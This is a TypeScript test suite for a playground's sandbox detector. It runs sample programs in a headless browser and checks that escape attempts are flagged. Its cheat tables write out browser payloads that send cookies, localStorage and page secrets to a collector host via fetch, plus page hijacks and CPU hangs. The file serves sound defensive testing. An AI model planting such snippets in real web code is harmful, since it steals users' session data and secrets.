import assert from "node:assert/strict";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { fileURLToPath } from "node:url";
import { after, before, describe, test } from "node:test";
import { build } from "esbuild";
import { chromium, type Browser } from "playwright";
import { compile } from "@thixo/core";
import { GOALS } from "thixo-bench/src/goals.ts";
import { BENCH_DTS, type Look } from "../src/playground/detector.ts";

const PAGE = `<!doctype html>
<html><head><meta charset="utf-8"><title>detector</title>
<style>#box { width: 400px; height: 300px; margin: 40px; border: 1px solid #999; }</style></head>
<body>
<div id="secret"></div>
<div id="outside">untouched</div>
<div id="box"></div>
<script src="/page.js"></script>
</body></html>`;

let browser: Browser;
let server: Server;
let collector: Server;
let origin = "";
let collectorOrigin = "";
let bundle = "";

const listen = (s: Server) => new Promise<string>((r) => s.listen(0, "127.0.0.1", () => r(`http://127.0.0.1:${(s.address() as AddressInfo).port}`)));

before(async () => {
  const out = await build({
    entryPoints: [fileURLToPath(new URL("./fixtures/detector-page.ts", import.meta.url))],
    bundle: true,
    write: false,
    format: "iife",
    platform: "browser",
    target: "es2022",
    conditions: ["thixo-source"],
    define: { "process.env.NODE_ENV": '"production"' },
    logLevel: "silent",
  });
  bundle = out.outputFiles[0].text;
  server = createServer((req, res) => {
    if (req.url === "/page.js") {
      res.setHeader("content-type", "text/javascript");
      return res.end(bundle);
    }
    if (req.url === "/") {
      res.setHeader("content-type", "text/html");
      return res.end(PAGE);
    }
    res.statusCode = req.url?.startsWith("/api/secret") ? 200 : 404;
    res.end("");
  });
  collector = createServer((_req, res) => {
    res.setHeader("access-control-allow-origin", "*");
    res.end("ok");
  });
  origin = await listen(server);
  collectorOrigin = await listen(collector);
  browser = await chromium.launch();
});

after(async () => {
  await browser.close();
  server.close();
  collector.close();
});

async function lookAt(code: string): Promise<Look & { problems: string[]; url: string; storage: unknown }> {
  const page = await browser.newPage();
  const problems: string[] = [];
  page.on("pageerror", (e) => problems.push(e.message));
  try {
    await page.goto(`${origin}/`);
    const result = await page.evaluate((c) => (window as unknown as { __look: (c: string) => Promise<Look> }).__look(c), code);
    const storage = await page.evaluate(() => ({ cookie: document.cookie, storage: localStorage.getItem("secret"), global: (window as unknown as { SECRET?: string }).SECRET ?? null, dom: document.getElementById("secret")!.textContent }));
    return { ...result, problems, url: page.url(), storage };
  } finally {
    await page.close();
  }
}

function raw(body: string): string {
  return `export default function (rt) {
  const fn = rt.fn(function App() { return null; });
  ${body}
  return rt.app(fn);
}`;
}

const show = (expr: string) => `setTimeout(() => { document.getElementById("box").textContent = ${expr}; }, 200);`;

const CHEATS: Record<string, string> = {
  "read-dom": show(`document.getElementById("secret").textContent`),
  "read-cookie": show(`document.cookie`),
  "read-storage": show(`localStorage.getItem("secret")`),
  "read-global": show(`window.SECRET`),
  "network-out": `fetch("COLLECTOR/x", { mode: "no-cors" });`,
  "network-home": `fetch("/api/secret");`,
  "run-script": `window.__pwned = true;`,
  "write-outside": `document.getElementById("outside").textContent = "changed";`,
  "navigate": `setTimeout(() => { location.href = "about:blank"; }, 100);`,
  "hang": `setTimeout(() => { const t = Date.now(); while (Date.now() - t < 3500) {} }, 50);`,
};

describe("the playground's detector sees each cheat", () => {
  test("every goal has a cheat", () => {
    assert.deepEqual(Object.keys(CHEATS).sort(), GOALS.map((g) => g.id).sort());
  });
  for (const g of GOALS) {
    test(g.id, async () => {
      const r = await lookAt(raw(CHEATS[g.id].replace("COLLECTOR", collectorOrigin)));
      assert.ok(r.reached.includes(g.id), `${g.id} not seen: ${JSON.stringify(r)}`);
      assert.equal(r.url, `${origin}/`, "the page stayed where it was");
    });
  }
});

function topLevel(body: string): string {
  return `${body}
export default function (rt) {
  const fn = rt.fn(function App() { return null; });
  return rt.app(fn);
}`;
}

const TOP_LEVEL_CHEATS: Record<string, string> = {
  ...CHEATS,
  "read-dom": `fetch("COLLECTOR/x?" + document.getElementById("secret").textContent, { mode: "no-cors" });`,
  "read-cookie": `fetch("COLLECTOR/x?" + document.cookie, { mode: "no-cors" });`,
  "read-storage": `fetch("COLLECTOR/x?" + localStorage.getItem("secret"), { mode: "no-cors" });`,
  "read-global": `fetch("COLLECTOR/x?" + window.SECRET, { mode: "no-cors" });`,
  "navigate": `location.href = "about:blank";`,
  "hang": `{ const t = Date.now(); while (Date.now() - t < 3500) {} }`,
};

describe("the detector sees each cheat when it runs as the module loads", () => {
  for (const g of GOALS) {
    test(g.id, async () => {
      const r = await lookAt(topLevel(TOP_LEVEL_CHEATS[g.id].replace("COLLECTOR", collectorOrigin)));
      assert.ok(r.reached.includes(g.id), `${g.id} not seen: ${JSON.stringify(r)}`);
      assert.equal(r.url, `${origin}/`, "the page stayed where it was");
    });
  }
});

test("a secret the program surfaces is reported without the secret itself", async () => {
  const r = await lookAt(raw(show(`"global " + window.SECRET`)));
  assert.deepEqual(r.reached, ["read-global"]);
  assert.equal(r.evidence.boxText, "global [the global secret]");
});

test("a secret sent in a request is seen and hidden", async () => {
  const r = await lookAt(raw(`fetch("COLLECTOR/?c=" + encodeURIComponent(document.cookie), { mode: "no-cors" });`.replace("COLLECTOR", collectorOrigin)));
  assert.deepEqual(r.reached.sort(), ["network-out", "read-cookie"]);
  assert.deepEqual(r.evidence.collectorHits, [`${collectorOrigin}/?c=secret%3D[the cookie secret]`]);
});

test("drawing over the page outside the box is seen", async () => {
  const r = await lookAt(raw(`setTimeout(() => { const d = document.createElement("div"); d.style.cssText = "position:fixed;inset:0;background:red"; document.getElementById("box").appendChild(d); }, 200);`));
  assert.ok(r.evidence.drewOutside);
  assert.ok(r.reached.includes("write-outside"));
});

test("a compiled program that uses its box and the pointer reaches nothing, and the secrets are taken away after", async () => {
  const compiled = compile(
    {
      "main.thx": `import { useState, useFrame, usePointer, useKeys, css } from "thixo";
import { say } from "bench";
export default function App() {
  const [t, setT] = useState(0);
  const p = usePointer();
  const keys = useKeys();
  useFrame((time) => setT(time));
  return <svg width="400" height="300" className={css({ display: "block" })} onClick={() => say("hi " + Math.round(p.x) + "," + Math.round(p.y))}>
    <circle cx={200 + Math.cos(t) * 80} cy={150} r={20} fill="teal" />
    <text x="10" y="20">{"inside " + p.inside + " keys " + keys.length}</text>
  </svg>;
}
`,
    },
    { modules: { bench: { dts: BENCH_DTS } } },
  );
  assert.ok(compiled.ok, JSON.stringify(!compiled.ok && compiled.errors));
  const r = await lookAt(compiled.code);
  assert.deepEqual(r.reached, [], JSON.stringify(r.evidence));
  assert.deepEqual(r.evidence.said, ["hi 200,150"], "the click landed in the middle of the box");
  assert.match(r.evidence.boxText, /inside true/);
  assert.deepEqual(r.evidence.runtimeErrors, []);
  assert.deepEqual(r.problems, []);
  assert.deepEqual(r.storage, { cookie: "", storage: null, global: null, dom: "" });
});
